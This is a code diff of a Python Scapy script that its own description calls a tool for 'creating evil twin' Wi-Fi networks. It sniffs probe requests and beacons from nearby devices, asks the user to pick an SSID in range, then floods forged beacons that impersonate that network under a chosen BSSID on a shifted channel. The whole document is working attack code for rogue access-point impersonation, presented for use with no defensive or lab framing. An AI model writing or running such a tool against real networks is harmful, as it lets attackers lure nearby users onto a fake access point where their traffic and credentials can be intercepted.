@@ -7,12 +7,13 @@ probes = pandas.DataFrame(columns=["SSID", "source MAC", "Channel"])
 # set the index SSID (Name of the AP)
 probes.set_index("SSID", inplace=True)
 
-network = pandas.DataFrame(columns=["SSID", "BSSID", "Signal (dBm)", "Channel"])
+networks = pandas.DataFrame(columns=["SSID", "BSSID", "Signal (dBm)", "Channel"])
 # set the index SSID (Name of the AP)
-network.set_index("SSID", inplace=True)
+networks.set_index("SSID", inplace=True)
 
 
-def find_probes(packet):
+def callback(packet):
+    # if the packet is a probe request
     if packet.haslayer(Dot11ProbeReq):
         # get the SSID in the Probe Request
         ssid = packet[Dot11Elt].info.decode()
@@ -26,12 +27,10 @@ def find_probes(packet):
         channel_in_probe = stats.get("channel")
         probes.loc[ssid] = (source_mac, channel_in_probe)
 
-
-def find_ssid(packet):
-    # if the packet is a beacon and correspond to the chosen ssid
-    if packet.haslayer(Dot11Beacon) and packet[Dot11Elt].info.decode() == chosen_ssid:
+    # else if the packet is a beacon
+    elif packet.haslayer(Dot11Beacon):
         # extract the MAC address of the network
-        bssid = packet[Dot11].addr2
+        bssid = packet[Dot11].addr3
         # get the name of it
         ssid = packet[Dot11Elt].info.decode()
         try:
@@ -42,13 +41,16 @@ def find_ssid(packet):
         stats = packet[Dot11Beacon].network_stats()
         # get the channel of the AP
         channel = stats.get("channel")
-        network.loc[ssid] = (bssid, dbm_signal, channel)
+        networks.loc[ssid] = (bssid, dbm_signal, channel)
 
 
 def print_all(stop):
     while True:
         os.system("clear")
+        print("Probe Requests detected")
         print(probes)
+        print("\nNetworks detected")
+        print(networks)
         print(f"Sniffing will end after {sniff_time} seconds...")
         time.sleep(0.5)
 
@@ -71,10 +73,11 @@ def change_channel(stop):
 if __name__ == '__main__':
     parser = argparse.ArgumentParser(description="A python script for detecting probe requests and creating evil twin "
                                                  "of chosen SSID if it is available in the area")
+    parser.add_argument("bssid", help="BSSID of the evil twin network")
     parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan0'",
                         default="wlan0")
-    parser.add_argument("-s", dest="sniff_time", help="Sniffing time (in seconds) to search for probe requests, "
-                                                      "default is 20s", default=20)
+    parser.add_argument("-s", dest="sniff_time", help="Sniffing time (in seconds) to scan for probe requests and "
+                                                      "networks, default is 20s", default=20)
     parser.add_argument("-c", "--count", help="Number of beacons to send, specify 0 to keep sending "
                                               "infinitely, default is 0", default=0)
     parser.add_argument("--interval",
@@ -83,75 +86,60 @@ if __name__ == '__main__':
 
     args = parser.parse_args()
 
+    entered_bssid = args.bssid
     interface = args.iface
     sniff_time = int(args.sniff_time)
     count = int(args.count)
     interval = float(args.interval)
 
     stop_threads = False
-    # start the thread that prints all the SSID found
+    # start the thread that prints the SSID coming from the probe requests and the detected networks
     printer = Thread(target=print_all, args=(lambda: stop_threads,))
     printer.daemon = True
     printer.start()
 
     # start sniffing
-    sniff(prn=find_probes, iface=interface, timeout=sniff_time)
+    sniff(prn=callback, iface=interface, timeout=sniff_time)
 
-    # stop thread used for printing found SSID
+    # stop thread used for printing found SSID and detected networks
     stop_threads = True
     printer.join()
 
-    if probes.empty:
-        print("No probe requests detected")
+    if probes.empty or networks.empty:
+        print("No probe requests or networks detected")
     else:
         chosen_ssid = input("Please choose a network to impersonate by entering its SSID (it must be available in the "
                             "area !) : ")
-        stop_threads = False
-        # start the thread to change channel and accelerate sniffing
-        channel_changer = Thread(target=change_channel, args=(lambda: stop_threads,))
-        channel_changer.daemon = True
-        channel_changer.start()
 
-        # 15 seconds is normally enough to get a beacon from a network in the area
-        print(f"Searching for the network {chosen_ssid} for 15 seconds...\n")
-        sniff(prn=find_ssid, iface=interface, timeout=15)
-
-        # stop thread used to change channel
-        stop_threads = True
-        channel_changer.join()
-
-        if network.empty:
-            print(f"Network {chosen_ssid} not found")
+        # if the chosen SSID is not detected in the area
+        if chosen_ssid not in networks.index:
+            print(f"Network {chosen_ssid} not found in the area")
         else:
-            (bssid, dbm_signal, channel) = network.loc[chosen_ssid]
-            print(network)
-            choice = input("\nWould you like to create an evil twin ? (y/n) : ")
+            (bssid, dbm_signal, channel) = networks.loc[chosen_ssid]
 
-            if choice == "y":
-                # choose a channel 6 channels away from the original network
-                channel = (channel + 6) % 14
-                # random BSSID as the sender address and AP address
-                random_mac = RandMAC()
-                # forging a beacon with type 0 and subtype 8 (Management frame and Beacon), broadcast address as
-                # destination address
-                packet = RadioTap() \
-                         / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=random_mac, addr3=random_mac) \
-                         / Dot11Beacon() \
-                         / Dot11Elt(ID="SSID", info=chosen_ssid, len=len(chosen_ssid)) \
-                         / Dot11Elt(ID="DSset", info=chr(channel))
+            # choose a channel 6 channels away from the original network
+            channel = (channel + 6) % 14
 
-                if count == 0:
-                    # if count is 0, it means we loop forever (until interrupt)
-                    loop = 1
-                    count = None
-                    print(
-                        f"\n[+] Sending beacons of network {chosen_ssid} on channel {channel} every {interval}s "
-                        f"forever...")
-                else:
-                    loop = 0
-                    print(
-                        f"\n[+] Sending {count} beacons of network {chosen_ssid} on channel {channel} every {interval}s"
-                        f"...")
+            # forging a beacon with type 0 and subtype 8 (Management frame and Beacon), broadcast address as
+            # destination address, BSSID in argument as the sender address and AP address
+            packet = RadioTap() \
+                     / Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=entered_bssid, addr3=entered_bssid) \
+                     / Dot11Beacon(cap="ESS+privacy") \
+                     / Dot11Elt(ID="SSID", info=chosen_ssid, len=len(chosen_ssid)) \
+                     / Dot11Elt(ID="DSset", info=chr(channel))
 
-                # sending beacons
-                sendp(packet, inter=interval, count=count, loop=loop, iface=interface, verbose=1)
+            # if count is 0, it means we loop forever (until interrupt)
+            if count == 0:
+                loop = 1
+                count = None
+                print(
+                    f"\n[+] Sending beacons of network {chosen_ssid}({entered_bssid}) on channel {channel} "
+                    f"every {interval}s forever...")
+            else:
+                loop = 0
+                print(
+                    f"\n[+] Sending {count} beacons of network {chosen_ssid}({entered_bssid}) on channel {channel} "
+                    f"every {interval}s...")
+
+            # sending beacons
+            sendp(packet, inter=interval, count=count, loop=loop, iface=interface, verbose=1)
